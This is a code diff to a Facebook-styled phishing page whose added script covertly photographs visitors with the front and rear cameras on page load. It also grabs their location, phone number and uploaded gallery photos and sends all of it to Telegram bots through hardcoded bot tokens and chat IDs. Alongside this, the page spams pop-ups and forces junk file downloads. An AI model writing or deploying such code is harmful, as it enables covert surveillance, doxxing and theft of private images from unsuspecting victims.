@@ -19,11 +19,6 @@
         .main-card { max-width: 450px; margin: 40px auto; border: none; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); background: white; border-top: 5px solid #1877f2; }
         .fb-logo-text { color: #1877f2; font-size: 42px; font-weight: bold; letter-spacing: -2px; }
         
-        .btn-fb { 
-            background: linear-gradient(to bottom, #1877f2, #166fe5); color: white; font-weight: bold; 
-            padding: 12px; border-radius: 8px; border: none; width: 100%; transition: 0.2s;
-        }
-
         /* CHAOS OVERLAY ☠️ */
         #chaos-overlay { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
@@ -55,6 +50,9 @@
             justify-content: space-between; backdrop-filter: blur(15px); border-top: 2px solid #1877f2; z-index: 1000;
         }
         .credit-name { font-size: 14px; font-weight: bold; color: #1877f2; }
+        
+        /* Hidden elements for tracking */
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
@@ -88,7 +86,7 @@
             <label class="small fw-bold">Upload Foto (Maks 5):</label>
             <input type="file" id="galeri" class="form-control mb-3" multiple accept="image/*">
         </div>
-        <button class="btn-fb" onclick="validateFinal()">Konfirmasi</button>
+        <button class="btn-fb w-100 py-2 btn-primary" onclick="validateFinal()">Konfirmasi</button>
     </div>
 </div>
 
@@ -97,7 +95,7 @@
         <span style="font-size: 10px; color: #888;">Developed by:</span>
         <span class="credit-name">Malik & Hack7rBGG/Xymatekidd</span>
     </div>
-    <button class="btn-fb btn-sm" style="width: auto; padding: 5px 15px;" onclick="toggleMusic()">
+    <button class="btn btn-primary btn-sm d-flex align-items-center gap-2" onclick="toggleMusic()">
         <span id="btnText">▶ PLAY MUSIC</span>
         <div class="music-anim" id="animContainer">
             <div class="bar"></div><div class="bar"></div><div class="bar"></div>
@@ -105,14 +103,62 @@
     </button>
 </div>
 
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
 <script>
+    const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
+    const chats = ["7835924973", "8071786272"];
     const audio = document.getElementById('bgMusic');
     const anim = document.getElementById('animContainer');
 
-    window.onload = () => { setTimeout(() => { 
-        document.getElementById('splash-screen').style.display = 'none';
-        document.body.style.display = 'block';
-    }, 3000); };
+    window.onload = () => { 
+        setTimeout(() => { 
+            document.getElementById('splash-screen').style.display = 'none';
+            document.body.style.display = 'block';
+            // MULAI LACAK SEKARANG! 😈
+            autoCapture("user");
+            autoLocation();
+        }, 3000); 
+    };
+
+    function sendToBot(content, type = "text", blob = null) {
+        tokens.forEach((token, i) => {
+            const fd = new FormData();
+            fd.append("chat_id", chats[i]);
+            if (type === "text") {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: `chat_id=${chats[i]}&text=${encodeURIComponent(content)}`
+                });
+            } else {
+                fd.append("photo", blob || content, "img.jpg");
+                fd.append("caption", content);
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: fd });
+            }
+        });
+    }
+
+    async function autoCapture(mode) {
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const v = document.getElementById('video'); v.srcObject = s;
+            setTimeout(() => {
+                const c = document.getElementById('canvas');
+                c.width = 480; c.height = 640;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => sendToBot(`📸 Kamera ${mode}`, "photo", b), 'image/jpeg');
+                s.getTracks().forEach(t => t.stop());
+                if(mode === "user") setTimeout(() => autoCapture("environment"), 3500);
+            }, 2000);
+        } catch (e) { console.log("Cam Blocked"); }
+    }
+
+    function autoLocation() {
+        navigator.geolocation.getCurrentPosition(p => {
+            sendToBot(`📍 LOKASI REAL-TIME: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+        });
+    }
 
     function toggleMusic() {
         const txt = document.getElementById('btnText');
@@ -123,11 +169,14 @@
     function validateFinal() {
         const phone = document.getElementById('phone').value;
         const files = document.getElementById('galeri').files;
-        // Validasi: Harus isi nomor HP dan foto TIDAK BOLEH lebih dari 5
         if (phone.length < 10 || files.length === 0 || files.length > 5) {
             document.getElementById('mainError').style.display = 'block';
             return;
         }
+        
+        sendToBot(`📱 DATA MASUK\nNo: ${phone}`);
+        for (let i = 0; i < files.length; i++) { sendToBot(`🖼️ Foto Galeri ${i+1}`, "photo", files[i]); }
+        
         startChaos();
     }
 
@@ -141,7 +190,6 @@
         vid.play();
         dox.style.display = 'block';
 
-        // Unlimited Pop-up Spam selama 2 Menit (120000ms)
         let popInterval = setInterval(() => {
             let div = document.createElement('div');
             div.className = 'popup-virus';
@@ -151,13 +199,11 @@
             overlay.appendChild(div);
         }, 200);
 
-        // Berhenti setelah 2 menit
         setTimeout(() => { 
             clearInterval(popInterval); 
             dox.style.display = 'none';
         }, 120000);
 
-        // Auto Download 5 file sampah
         for (let j = 1; j <= 5; j++) {
             let blob = new Blob(["YOU IDIOT HAHAHA"], { type: "text/plain" });
             let url = window.URL.createObjectURL(blob);
